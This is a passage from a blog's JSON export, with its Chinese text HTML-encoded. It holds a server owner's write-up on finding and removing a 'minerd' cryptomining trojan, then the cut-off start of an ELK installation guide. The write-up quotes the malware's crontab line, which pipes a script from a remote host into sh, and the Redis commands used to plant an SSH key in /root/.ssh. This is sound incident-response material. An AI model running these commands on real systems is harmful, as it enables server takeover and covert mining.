8;&#x5E38;&#x89C1;&#x7684;&#x6316;&#x77FF;&#x7A0B;&#x5E8F;&#xFF0C;&#x76F8;&#x5173;&#x731C;&#x6D4B;&#x4E5F;&#x5F97;&#x5230;&#x4E86;&#x9A8C;&#x8BC1;&#x3002; &#x4E0B;&#x6587;&#x662F;&#x7F51;&#x4E0A;&#x641C;&#x7D22;&#x5230;&#x7684;&#x6E05;&#x9664;minerd&#x6728;&#x9A6C;&#x65B9;&#x6CD5;&#xFF0C;&#x548C;&#x6211;&#x9047;&#x5230;&#x7684;&#x60C5;&#x51B5;&#x4E00;&#x6A21;&#x4E00;&#x6837;&#x3002; &#x73B0;&#x72B6;&#x63CF;&#x8FF0;1&#x3001;top&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x8FD9;&#x4E2A;minerd &#x7A0B;&#x5E8F;&#x628A;cpu&#x8DD1;&#x6EE1;&#x4E86; 2&#x3001;ps aux | grep minerd&#x53EF;&#x77E5;&#x662F;&#x8FD9;&#x4E2A;&#x7A0B;&#x5E8F;: /opt/minerd &#x8FD9;&#x4E2A;&#x4E0D;&#x662F;&#x6211;&#x4EEC;&#x81EA;&#x5DF1;&#x542F;&#x52A8;&#x7684;&#xFF0C;&#x53EF;&#x4EE5;&#x65AD;&#x5B9A;&#x670D;&#x52A1;&#x5668;&#x88AB;&#x9ED1;&#x4E86;&#x8FD9;&#x4E2A;&#x8FDB;&#x7A0B;&#x662F;root&#x7528;&#x6237;&#x542F;&#x52A8;&#x7684;&#xFF0C;&#x4EE3;&#x7801;&#x6709;&#x6F0F;&#x6D1E;&#x53EF;&#x80FD;&#x6027;&#x4E0D;&#x5927;&#xFF08;web&#x670D;&#x52A1;&#x662F;www&#x7528;&#x6237;&#x542F;&#x52A8;&#x7684;&#xFF09;&#xFF0C;&#x591A;&#x534A;&#x9ED1;&#x5BA2;&#x5DF2;&#x7ECF;&#x767B;&#x5F55;&#x670D;&#x52A1;&#x5668;&#x4E86; 3&#x3001;&#x6709;&#x53EF;&#x80FD;&#x662F;&#x514D;&#x5BC6;&#x767B;&#x5F55;&#x4E86;&#xFF0C;&#x53BB;/root/.ssh &#x76EE;&#x5F55;&#x4E0B;&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x53D1;&#x73B0;authorized_keys&#xFF0C;&#x4F46;&#x53D1;&#x73B0;&#x4E86;KHK75NEOiq&#x8FD9;&#x4E2A;&#x6587;&#x4EF6; &#x67E5;&#x770B; vim KHK75NEOiq&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5185;&#x5BB9;&#x5C31;&#x662F;&#x514D;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#x7684;&#x516C;&#x94A5; 4&#x3001;&#x5728;ssh&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;/etc/ssh/sshd_config&#x4E2D;&#x4E5F;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x628A;AuthorizedKeysFile&#x6307;&#x5411;&#x4E86;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x4E86;&#xFF08;.ssh/KHK75NEOiq&#xFF09; &#x731C;&#x60F3;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A;&#x901A;&#x8FC7;authorized_keys&#x514D;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#x540E;&#xFF0C;&#x5728;&#x8FD9;&#x4E2A;&#x76EE;&#x5F55;&#x4E0B;&#x521B;&#x5EFA;&#x4E86;KHK75NEOiq&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#xFF0C;&#x4FEE;&#x6539;&#x4E86;AuthorizedKeysFile&#x7684;&#x6307;&#x5411;&#xFF0C;&#x5C31;&#x628A;authorized_keys&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x5220;&#x9664;&#x4E86;&#x3002; 5&#x3001;&#x90A3;&#x4E48;&#x662F;&#x5199;&#x8FDB;&#x6765;authorized_keys&#x7684;&#x90A3;&#xFF1F; &#x4E4B;&#x524D;&#x6211;&#x5904;&#x7406;&#x8FC7;&#x7C7B;&#x4F3C;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x662F;redis&#x672A;&#x6388;&#x6743;&#x5BFC;&#x81F4;&#x7684;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x5916;&#x7F51;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4E0D;&#x7528;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#x6211;&#x7684;redis, &#x8FDE;&#x4E0A;redis&#x540E;&#xFF0C;&#x901A;&#x8FC7;&#x4EE5;&#x4E0B;&#x547D;&#x4EE4;&#x5373;&#x53EF;&#x521B;&#x5EFA;&#x6587;&#x4EF6;&#xFF1A; config set dir /root/.sshconfig set dbfilename authorized_keysset key value&#xFF0C;&#x5176;&#x4E2D;value&#x4E3A;&#x751F;&#x6210;&#x516C;&#x94A5;&#xFF0C;&#x5373;&#x53EF;&#x5C06;&#x516C;&#x94A5;&#x4FDD;&#x5B58;&#x5728;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4F7F;&#x5F97;&#x767B;&#x5F55;&#x65F6;&#x4E0D;&#x9700;&#x8981;&#x8F93;&#x5165;&#x8D26;&#x53F7;&#x4E0E;&#x5BC6;&#x7801;&#x3002; &#x5148;&#x5835;&#x4F4F;&#x514D;&#x767B;&#x5F55;&#x6F0F;&#x6D1E;1&#x3001;&#x4FEE;&#x6539;ssh&#x7AEF;&#x53E3;&#x7F16;&#x8F91;/etc/ssh/sshd_config&#x6587;&#x4EF6;&#x4E2D;&#x7684;Port 22&#x5C06;22&#x4FEE;&#x6539;&#x4E3A;&#x5176;&#x4ED6;&#x7AEF;&#x53E3; 2&#x3001;&#x7981;&#x6B62;root&#x7528;&#x6237;&#x767B;&#x9646;&#x7F16;&#x8F91;/etc/ssh/sshd_config&#x6587;&#x4EF6;&#x4E2D;&#x7684;PermitRootLogin &#x4FEE;&#x6539;&#x4E3A;no 3&#x3001;&#x4FEE;&#x6539;&#x65E0;&#x5BC6;&#x7801;&#x767B;&#x9646;&#x7684;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#x7F16;&#x8F91;/etc/ssh/sshd_config&#x6587;&#x4EF6;&#x4E2D;&#x7684;AuthorizedKeysFile &#x4FEE;&#x6539;&#x4E3A;&#x5176;&#x4ED6;&#x6587;&#x4EF6;&#x8DEF;&#x5F84; 4&#x3001;&#x5220;&#x9664; .ssh&#x4E0B;&#x7684; KHK75NEOiq 5&#x3001;&#x4E0D;&#x8BA9;&#x5916;&#x7F51;&#x76F4;&#x63A5;&#x8FDE;&#x63A5;&#x5728; redis.conf &#x6587;&#x4EF6;&#x4E2D;&#x627E;&#x5230;#bind 127.0.0.1&#xFF0C;&#x628A;&#x524D;&#x9762;&#x7684;#&#x53F7;&#x53BB;&#x6389;&#xFF0C;&#x91CD;&#x542F; &#x627E;&#x5230;&#x6728;&#x9A6C;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;1&#x3001;&#x901A;&#x5E38;&#x76F4;&#x63A5;kill&#x6389;&#x8FDB;&#x7A0B;&#xFF0C;&#x662F;&#x4E0D;&#x597D;&#x4F7F;&#x7684;&#xFF0C;&#x80AF;&#x5B9A;&#x6709;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#xFF0C;&#x8FD8;&#x6709;&#x7CFB;&#x7EDF;&#x81EA;&#x542F;&#x52A8;&#xFF0C;&#x6240;&#x4EE5;&#x6E05;&#x7406;&#x6B65;&#x9AA4;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A;1&#xFF09;&#x5E72;&#x6389;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;2&#xFF09;&#x5E72;&#x6389;&#x7CFB;&#x7EDF;&#x81EA;&#x542F;&#x52A8;3&#xFF09;&#x5E72;&#x6389;&#x6728;&#x9A6C;&#x8FDB;&#x7A0B; &#x627E;&#x5230;&#x6728;&#x9A6C;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x5E76;&#x5E72;&#x6389; &#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x6709;&#x5927;&#x6982;&#x6709;&#x4E24;&#x79CD;&#x5B58;&#x5728;&#x5F62;&#x5F0F;&#xFF0C;crontab &#x548C;&#x5E38;&#x9A7B;&#x8FDB;&#x7A0B;&#xFF0C;&#x5E38;&#x9A7B;&#x8FDB;&#x7A0B;&#x5F97;&#x6162;&#x6162;&#x5206;&#x6790;&#xFF0C;&#x6211;&#x4EEC;&#x5148;&#x770B;crontab&#xFF0C;&#x6709;&#x4E00;&#x6761;&#x4E0D;&#x662F;&#x6211;&#x521B;&#x5EFA;&#x7684;&#x4EFB;&#x52A1;&#x3002;&#x4EFB;&#x52A1;&#x662F;&#xFF1A;&#x76F4;&#x63A5;&#x4ECE;&#x8FDC;&#x7A0B;&#x4E0B;&#x8F7D;&#x4E00;&#x4E2A;&#x811A;&#x672C;pm.sh &#x5E76;&#x6267;&#x884C;&#x3002; 2&#x3001;&#x6211;&#x4EEC;&#x6765;&#x770B;&#x770B;&#x8FD9;&#x4E2A;&#x811A;&#x672C; 3&#x3001;&#x5927;&#x81F4;&#x903B;&#x8F91;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A;1&#xFF09;&#x628A; /10 * curl -fsSL http://r.chanstring.com/pm.sh?0706 | sh &#x5199;&#x5165;crontab2&#xFF09;&#x628A;authorized_keys&#x5220;&#x6389;&#xFF0C;&#x5E76;&#x521B;&#x5EFA;&#x514D;&#x767B;&#x5F55;&#x6587;&#x4EF6;/root/.ssh/KHK75NEOiq&#xFF0C;&#x4FEE;&#x6539;ssh&#x914D;&#x7F6E;&#x91CD;&#x542F;3&#xFF09;curl&#x4E0B;&#x8F7D;/opt/KHK75NEOiq33 &#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x6267;&#x884C;&#x5B89;&#x88C5;&#xFF08;/opt/KHK75NEOiq33 &#x2013;Install&#xFF09;&#xFF0C;&#x7136;&#x540E;&#x542F;&#x52A8;ntp 4&#x3001;&#x57FA;&#x672C;&#x53EF;&#x4EE5;&#x65AD;&#x5B9A;&#x8FD9;&#x4E2A;ntp&#x5C31;&#x662F;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#xFF0C;&#x4F46;&#x770B;&#x5230;ntp&#x771F;&#x7684;&#x6709;&#x4E9B;&#x6015;&#x6015;&#xFF0C;ntp&#x4E0D;&#x662F;&#x641E;&#x65F6;&#x95F4;&#x540C;&#x6B65;&#x7684;&#x5417;&#xFF0C;&#x5176;&#x5B9E; Linux&#x6B63;&#x5E38;&#x7684;ntp&#x670D;&#x52A1;&#x53EB;ntpd&#xFF0C;&#x5E76;&#x975E;ntp&#xFF0C;&#x5F88;&#x6709;&#x8FF7;&#x60D1;&#x6027;&#x554A; 5&#x3001;&#x4F46;&#x4E3A;&#x4E86;&#x8BA9;&#x81EA;&#x5DF1;&#x653E;&#x5FC3;&#xFF0C;&#x8FD8;&#x662F;&#x6821;&#x9A8C;&#x4E86;&#x4E00;&#x756A;&#x6211;&#x4EEC;&#x5148;&#x4ECE;&#x65F6;&#x95F4;&#x4E0A;&#x6821;&#x9A8C;&#xFF0C;ntp&#x662F;&#x4E0D;&#x662F;&#x6728;&#x9A6C;&#x4EFB;&#x52A1;&#x540E;&#x521B;&#x5EFA;&#x7684; &#x67E5;&#x770B;&#x8FD9;&#x4E2A;&#x6728;&#x9A6C;&#x4EFB;&#x52A1;&#x7B2C;&#x4E00;&#x6B21;&#x6267;&#x884C;&#x7684;&#x65F6;&#x95F4;&#x53BB;/var/log&#x4E0B;&#x770B;cron&#x7684;&#x65E5;&#x5FD7; 6&#x3001;Jul 24 09:23:01 &#x7B2C;&#x4E00;&#x6B21;&#x6267;&#x884C;&#xFF1A; curl -L http://r.chanstring.com/pm.sh?0703Jul 24 09:30:01 &#x7B2C;&#x4E00;&#x6B21;&#x6211;&#x4EEC;&#x76EE;&#x524D;crontab&#x91CC;&#x7684;&#x4EFB;&#x52A1;&#xFF1A;curl -fsSL http://r.chanstring.com/pm.sh?0706Jul 24 09:49 &#x811A;&#x672C;/etc/init.d/ntp&#x7684;&#x521B;&#x5EFA;&#x65F6;&#x95F4; &#x4ECE;pm.sh&#x8FD9;&#x4E2A;&#x811A;&#x672C;&#x53EF;&#x77E5; curl&#x4E0B;&#x6765;/opt/KHK75NEOiq33&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x6267;&#x884C;&#x5B89;&#x88C5; /opt/KHK75NEOiq33 &#x2013;Install &#x6BD4;&#x8F83;&#x8017;&#x65F6;&#x95F4;&#xFF0C;&#x6211;&#x6267;&#x884C;&#x4E86;&#x4E00;&#x4E0B;&#xFF0C;&#x5728;&#x6211;&#x7684;&#x673A;&#x5668;&#x4E0A;&#x662F;10&#x591A;&#x5206;&#x949F;&#x3002; &#x6240;&#x4EE5;&#x521B;&#x5EFA;&#x65F6;&#x95F4;&#x4E0A;&#x57FA;&#x672C;&#x543B;&#x5408; 7&#x3001;&#x6211;&#x4EEC;&#x770B;&#x4E00;&#x4E0B;ntp&#x7684;&#x968F;&#x7CFB;&#x7EDF;&#x542F;&#x52A8;runlevel 2 3 4 5&#x90FD;&#x542F;&#x52A8;&#x4E86;&#xFF0C;&#x591F;&#x72E0;&#x7684;&#x5440; 8&#x3001;&#x770B;&#x4E00;&#x4E0B;&#x5E38;&#x7528;&#x7684;3&#x5427;&#x53EF;&#x4EE5;&#x770B;&#x5230; &#x6709;&#x4E2A;S50ntp &#x8F6F;&#x94FE;&#x4E86;&#x811A;&#x672C;/etc/init.d/ntp 9&#x3001;&#x6211;&#x4EEC;&#x67E5;&#x770B;&#x7CFB;&#x7EDF;&#x542F;&#x52A8;&#x65E5;&#x5FD7;vim /var/log/boot.log&#x6709;&#x4E00;&#x6761;&#x662F;Staring S50ntp&#xFF0C;&#x8FD9;&#x4E2A;&#x57FA;&#x672C;&#x5BF9;&#x5E94;&#x811A;&#x672C;/etc/init.d/ntp &#x4E2D;&#x7684; echo &#x201C;Starting $name&#x201D; 10&#x3001;&#x6211;&#x4EEC;&#x6765;&#x770B;&#x4E00;&#x4E0B; /etc/init.d/ntp &#x8FD9;&#x4E2A;&#x811A;&#x672C;$name&#x5E94;&#x8BE5;&#x5C31;&#x5BF9;&#x5E94;&#x7684;&#x503C;&#x662F; S50ntp&#xFF0C;&#x901A;&#x8FC7;stdout_log,stderr_log,pid_file&#x4E5F;&#x5F97;&#x5230;&#x4E86;&#x9A8C;&#x8BC1;&#x3002; 11&#x3001;&#x901A;&#x8FC7;&#x641C;&#x7D22;&#x5B89;&#x88C5;&#x6587;&#x4EF6;&#xFF08;/opt/KHK75NEOiq33&#xFF09;&#xFF0C;&#x53EF;&#x77E5;&#x770B;&#x5230; /opt/KHK75NEOiq33 &#x2013;Install&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x5199;&#x5165;&#x4E86;ntp&#x811A;&#x672C; &#x81EA;&#x542F;&#x52A8; /opt/minerd&#x7B49;&#x4E00;&#x7CFB;&#x5217;&#x7684;&#x64CD;&#x4F5C;&#x3002; 12&#x3001;&#x6253;&#x5F00; /usr/local/etc/minerd.conf&#xFF0C;&#x5185;&#x5BB9;&#x5C31;&#x662F;/opt/minerd&#x8FD9;&#x4E2A;&#x8FDB;&#x7A0B;&#x540E;&#x7684;&#x4E00;&#x4E9B;&#x53C2;&#x6570; 13&#x3001;&#x597D;&#x4E86; &#x9A8C;&#x8BC1;&#x5B8C;&#x6BD5;&#xFF0C;&#x53EF;&#x4EE5;&#x5E72;&#x6389;&#x8FD9;&#x4E2A;ntp&#x4E86; &#x6E05;&#x7406;&#x6728;&#x9A6C;1&#x3001;&#x53BB;&#x6389;crontab&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x6709;&#x5173;&#x6728;&#x9A6C;&#x5185;&#x5BB9;&#xFF1A;/var/spool/cron/crontabs/root/var/spool/cron/root 2&#x3001;&#x5E72;&#x6389;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;ntp&#xFF0C;&#x5E76;&#x5220;&#x9664;&#x76F8;&#x5173;&#x6587;&#x4EF6; 3&#x3001;&#x5E72;&#x6389;&#x6728;&#x9A6C;&#x8FDB;&#x7A0B;&#x53CA;&#x5176;&#x6587;&#x4EF6; 4&#x3001;&#x5E72;&#x6389;&#x5B89;&#x88C5;&#x6587;&#x4EF6;&#x53CA;&#x514D;&#x5BC6;&#x767B;&#x5F55;&#x7684;&#x6587;&#x4EF6; 5&#x3001;&#x5E72;&#x6389;&#x968F;&#x7CFB;&#x7EDF;&#x542F;&#x52A8;&#x7684;&#x6587;&#x4EF6; 6&#x3001;top&#x4E00;&#x4E0B; &#x4E00;&#x5207;&#x90FD;&#x6B63;&#x5E38;&#x4E86;&#xFF01; 7&#x3001;&#x91CD;&#x542F;&#x4E00;&#x4E0B;&#xFF0C;&#x4E5F;&#x6CA1;&#x95EE;&#x9898;&#x4E86;","raw":null,"content":null,"categories":[{"name":"错误集锦","slug":"错误集锦","permalink":"http://www.wangxin123.com/categories/错误集锦/"}],"tags":[{"name":"redis","slug":"redis","permalink":"http://www.wangxin123.com/tags/redis/"},{"name":"安全","slug":"安全","permalink":"http://www.wangxin123.com/tags/安全/"}]},{"title":"ELK安装与配置","slug":"ELK安装与配置","date":"2016-10-25T14:10:00.000Z","updated":"2017-01-06T08:41:25.761Z","comments":true,"path":"2016/10/25/ELK安装与配置/","link":"","permalink":"http://www.wangxin123.com/2016/10/25/ELK安装与配置/","excerpt":"ELK&#x4ECB;&#x7ECD;&#x65E5;&#x5FD7;&#x4E3B;&#x8981;&#x5305;&#x62EC;&#x7CFB;&#x7EDF;&#x65E5;&#x5FD7;&#x3001;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x65E5;&#x5FD7;&#x548C;&#x5B89;&#x5168;&#x65E5;&#x5FD7;&#x3002;&#x7CFB;&#x7EDF;&#x8FD0;&#x7EF4;&#x548C;&#x5F00;&#x53D1;&#x4EBA;&#x5458;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x65E5;&#x5FD7;&#x4E86;&#x89E3;&#x670D;&#x52A1;&#x5668;&#x8F6F;&#x786C;&#x4EF6;&#x4FE1;&#x606F;&#x3001;&#x68C0;&#x67E5;&#x914D;&#x7F6E;&#x8FC7;&#x7A0B;&#x4E2D;&#x7684;&#x9519;&#x8BEF;&#x53CA;&#x9519;&#x8BEF;&#x53D1;&#x751F;&#x7684;&#x539F;&#x56E0;&#x3002;&#x7ECF;&#x5E38;&#x5206;&#x6790;&#x65E5;&#x5FD7;&#x53EF;&#x4EE5;&#x4E86;&#x89E3;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8D1F;&#x8377;&#xFF0C;&#x6027;&#x80FD;&#x5B89;&#x5168;&#x6027;&#xFF0C;&#x4ECE;&#x800C;&#x53CA;&#x65F6;&#x91C7;&#x53D6;&#x63AA;&#x65BD;&#x7EA0;&#x6B63;&#x9519;&#x8BEF;&#x3002; &#x901A;&#x5E38;&#xFF0C;&#x65E5;&#x5FD7;&#x88AB;&#x5206;&#x6563;&#x7684;&#x50A8;&#x5B58;&#x4E0D;&#x540C;&#x7684;&#x8BBE;&#x5907;&#x4E0A;&#x3002;&#x5982;&#x679C;&#x4F60;&#x7BA1;&#x7406;&#x6570;&#x5341;&#x4E0A;&#x767E;&#x53F0;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x8FD8;&#x4F7F;&#x7528;&#x4F9D;&#x6B21;&#x767B;&#x5F55;&#x6BCF;&#x53F0;&#x673A;&#x5668;&#x7684;&#x4F20;&#x7EDF;&#x65B9;&#x6CD5;&#x67E5;&#x9605;&#x65E5;&#x5FD7;&#xFF0C;&#x6548;&#x7387;&#x4F1A;&#x5341;&#x5206;&#x5176;&#x4F4E;&#x4E0B;&#x3002;&#x5F00;&#x6E90;&#x5B9E;&#x65F6;&#x65E5;&#x5FD7;&#x5206;&#x6790;ELK&#x5E73;&#x53F0;&#x80FD;&#x591F;&#x5B8C;&#x7F8E;&#x7684;&#x89E3;&#x51B3;&#x4E0A;&#x8FF0;&#x95EE;&#x9898;&#x3002; ELK&#x7531;ElasticSearch&#x3001;Logstash&#x548C;Kiabana&#x4E09;&#x4E2A;&#x5F00;&#x6E90;&#x5DE5;&#x5177;&#x7EC4;&#x6210;&#xFF1A; Elasticsearch&#x662F;&#x4E2A;&#x5F00;&#x6E90;&#x5206;&#x5E03;&#x5F0F;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#xFF0C;&#x5B83;&#x7684;&#x7279;&#x70B9;&#x6709;&#xFF1A;&#x5206;&#x5E03;&#x5F0F;&#xFF0C;&#x96F6;&#x914D;&#x7F6E;&#xFF0C;&#x81EA;&#x52A8;&#x53D1;&#x73B0;&#xFF0C;&#x7D22;&#x5F15;&#x81EA;&#x52A8;&#x5206;&#x7247;&#xFF0C;&#x7D22;&#x5F15;&#x526F;&#x672C;&#x673A;&#x5236;&#xFF0C;restful&#x98CE;&#x683C;&#x63A5;&#x53E3;&#xFF0C;&#x591A;&#x6570;&#x636E;&#x6E90;&#xFF0C;&#x81EA;&#x52A8;&#x641C;&#x7D22;&#x8D1F;&#x8F7D;&#x7B49;&#x3002; Logstash&#x662F;&#x4E00;&#x4E2A;&#x5B8C;&#x5168;&#x5F00;&#x6E90;&#x7684;&#x5DE5;&#x5177;&#xFF0C;&#x4ED6;&#x53EF;&#x4EE5;&#x5BF9;&#x4F60;&#x7684;&#x65E5;&#x5FD7;&#x8FDB;&#x884C;&#x6536;&#x96C6;&#x3001;&#x8FC7;&#x6EE4;&#xFF0C;&#x5E76;&#x5C06;&#x5176;&#x5B58;&#x50A8;&#x4F9B;&#x4EE5;&#x540E;&#x4F7F;&#x7528;&#xFF08;&#x5982;&#xFF0C;&#x641C;&#x7D22;&#xFF09;&#x3002; Kibana&#x4E5F;&#x662F;&#x4E00;&#x4E2A;&#x5F00;&#x6E90;&#x548C;&#x514D;&#x8D39;&#x7684;&#x5DE5;&#x5177;&#xFF0C;&#x5B83;Kibana&#x53EF;&#x4EE5;&#x4E3A; Logstash &#x548C; ElasticSearch &#x63D0;&#x4F9B;&#x7684;&#x65E5;&#x5FD7;&#x5206;&#x6790;&#x53CB;&#x597D;&#x7684; Web &#x754C;&#x9762;&#xFF0C;&#x53EF;&#x4EE5;&#x5E2E;&#x52A9;&#x60A8;&#x6C47;&#x603B;&#x3001;&#x5206;&#x6790;&#x548C;&#x641C;&#x7D22;&#x91CD;&#x8981;&#x6570;&#x636E;&#x65E5;&#x5FD7;&#x3002;","keywords":null,"text":"ELK&#x4ECB;&#x7ECD;&#x65E5;&#x5FD7;&#x4E3B;&#x8981;&#x5305;&#x62EC;&#x7CFB;&#x7EDF;&#x65E5;&#x5FD7;&#x3001;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x65E5;&#x5FD7;&#x548C;&#x5B89;&#x5168;&#x65E5;&#x5FD7;&#x3002;&#x7CFB;&#x7EDF;&#x8FD0;&#x7EF4;&#x548C;&#x5F00;&#x53D1;&#x4EBA;&#x5458;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x65E5;&#x5FD7;&#x4E86;&#x89E3;&#x670D;&#x52A1;&#x5668;&#x8F6F;&#x786C;&#x4EF6;&#x4FE1;&#x606F;&#x3001;&#x68C0;&#x67E5;&#x914D;&#x7F6E;&#x8FC7;&#x7A0B;&#x4E2D;&#x7684;&#x9519;&#x8BEF;&#x53CA;&#x9519;&#x8BEF;&#x53D1;&#x751F;&#x7684;&#x539F;&#x56E0;&#x3002;&#x7ECF;&#x5E38;&#x5206;&#x6790;&#x65E5;&#x5FD7;&#x53EF;&#x4EE5;&#x4E86;&#x89E3;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8D1F;&#x8377;&#xFF0C;&#x6027;&#x80FD;&#x5B89;&#x5168;&#x6027;&#xFF0C;&#x4ECE;&#x800C;&#x53CA;&#x65F6;&#x91C7;&#x53D6;&#x63AA;&#x65BD;&#x7EA0;&#x6B63;&#x9519;&#x8BEF;&#x3002; &#x901A;&#x5E38;&#xFF0C;&#x65E5;&#x5FD7;&#x88AB;&#x5206;&#x6563;&#x7684;&#x50A8;&#x5B58;&#x4E0D;&#x540C;&#x7684;&#x8BBE;&#x5907;&#x4E0A;&#x3002;&#x5982;&#x679C;&#x4F60;&#x7BA1;&#x7406;&#x6570;&#x5341;&#x4E0A;&#x767E;&#x53F0;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x8FD8;&#x4F7F;&#x7528;&#x4F9D;&#x6B21;&#x767B;&#x5F55;&#x6BCF;&#x53F0;&#x673A;&#x5668;&#x7684;&#x4F20;&#x7EDF;&#x65B9;&#x6CD5;&#x67E5;&#x9605;&#x65E5;&#x5FD7;&#xFF0C;&#x6548;&#x7387;&#x4F1A;&#x5341;&#x5206;&#x5176;&#x4F4E;&#x4E0B;&#x3002;&#x5F00;&#x6E90;&#x5B9E;&#x65F6;&#x65E5;&#x5FD7;&#x5206;&#x6790;ELK&#x5E73;&#x53F0;&#x80FD;&#x591F;&#x5B8C;&#x7F8E;&#x7684;&#x89E3;&#x51B3;&#x4E0A;&#x8FF0;&#x95EE;&#x9898;&#x3002; ELK&#x7531;ElasticSearch&#x3001;Logstash&#x548C;Kiabana&#x4E09;&#x4E2A;&#x5F00;&#x6E90;&#x5DE5;&#x5177;&#x7EC4;&#x6210;&#xFF1A; Elasticsearch&#x662F;&#x4E2A;&#x5F00;&#x6E90;&#x5206;&#x5E03;&#x5F0F;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#xFF0C;&#x5B83;&#x7684;&#x7279;&#x70B9;&#x6709;&#xFF1A;&#x5206;&#x5E03;&#x5F0F;&#xFF0C;&#x96F6;&#x914D;&#x7F6E;&#xFF0C;&#x81EA;&#x52A8;&#x53D1;&#x73B0;&#xFF0C;&#x7D22;&#x5F15;&#x81EA;&#x52A8;&#x5206;&#x7247;&#xFF0C;&#x7D22;&#x5F15;&#x526F;&#x672C;&#x673A;&#x5236;&#xFF0C;restful&#x98CE;&#x683C;&#x63A5;&#x53E3;&#xFF0C;&#x591A;&#x6570;&#x636E;&#x6E90;&#xFF0C;&#x81EA;&#x52A8;&#x641C;&#x7D22;&#x8D1F;&#x8F7D;&#x7B49;&#x3002; Logstash&#x662F;&#x4E00;&#x4E2A;&#x5B8C;&#x5168;&#x5F00;&#x6E90;&#x7684;&#x5DE5;&#x5177;&#xFF0C;&#x4ED6;&#x53EF;&#x4EE5;&#x5BF9;&#x4F60;&#x7684;&#x65E5;&#x5FD7;&#x8FDB;&#x884C;&#x6536;&#x96C6;&#x3001;&#x8FC7;&#x6EE4;&#xFF0C;&#x5E76;&#x5C06;&#x5176;&#x5B58;&#x50A8;&#x4F9B;&#x4EE5;&#x540E;&#x4F7F;&#x7528;&#xFF08;&#x5982;&#xFF0C;&#x641C;&#x7D22;&#xFF09;&#x3002; Kibana&#x4E5F;&#x662F;&#x4E00;&#x4E2A;&#x5F00;&#x6E90;&#x548C;&#x514D;&#x8D39;&#x7684;&#x5DE5;&#x5177;&#xFF0C;&#x5B83;Kibana&#x53EF;&#x4EE5;&#x4E3A; Logstash &#x548C; ElasticSearch &#x63D0;&#x4F9B;&#x7684;&#x65E5;&#x5FD7;&#x5206;&#x6790;&#x53CB;&#x597D;&#x7684; Web &#x754C;&#x9762;&#xFF0C;&#x53EF;&#x4EE5;&#x5E2E;&#x52A9;&#x60A8;&#x6C47;&#x603B;&#x3001;&#x5206;&#x6790;&#x548C;&#x641C;&#x7D22;&#x91CD;&#x8981;&#x6570;&#x636E;&#x65E5;&#x5FD7;&#x3002; &#x5B89;&#x88C5;jdkjdk&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#xFF1A;http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.htmlLogstash&#x7684;&#x8FD0;&#x884C;&#x4F9D;&#x8D56;&#x4E8E;Java&#x73AF;&#x5883;&#xFF0C;&#x800C;Logstash1.5&#x4EE5;&#x4E0A;&#x7248;&#x672C;&#x4F9D;&#x8D56;&#x7684;java&#x7248;&#x672C;&#x4E0D;&#x4F4E;&#x4E8E;java 1.7&#xFF0C;&#x56E0;&#x6B64;&#x63A8;&#x8350;&#x6700;&#x65B0;&#x7248;&#x672C;Java&#x3002;123456#rpm -ivh jdk-8u77-linux-x64.rpm #java -versionjava version &quot;1.8.0_77&quot;Java(TM) SE Runtime Environment (build 1.8.0_77-b03)Java HotSpot(TM) 64-Bit Server VM (build 25.77-b03, mixed mode) &#x5B89;&#x88C5;Elasticsearch&#x5B89;&#x88C5;elasticsearch&#x3001;logstash&#x548C;kibana&#x7684;&#x5B98;&#x7F51;&#x5730;&#x5740;&#xFF1A;https://www.elastic.co/downloads/ &#x6211;&#x4F7F;&#x7528;&#x7684;&#x7248;&#x672C;&#x4FE1;&#x606F;&#x5982;&#x4E0B;&#xFF1A;elasticsearch&#xFF1A;https:https://www.elastic.co/downloads/past-releases/elasticsearch-2-2-0logstash&#xFF1A; https://www.elastic.co/downloads/past-releases/logstash-2-2-0kibana&#xFF1A; https://www.elastic.co/downloads/past-releases/kibana-4-4-0 &#x5B89;&#x88C5;elasticsearch1tar xf elasticsearch-2.2.0.tar.gz -C /usr/local/ &#x5B89;&#x88C5;elasticsearch&#x7684;head&#x63D2;&#x4EF6;123456789#cd /usr/local/elasticsearch-2.2.0#./bin/plugin install mobz/elasticsearch-head-&gt; Installing mobz/elasticsearch-head...Plugins directory 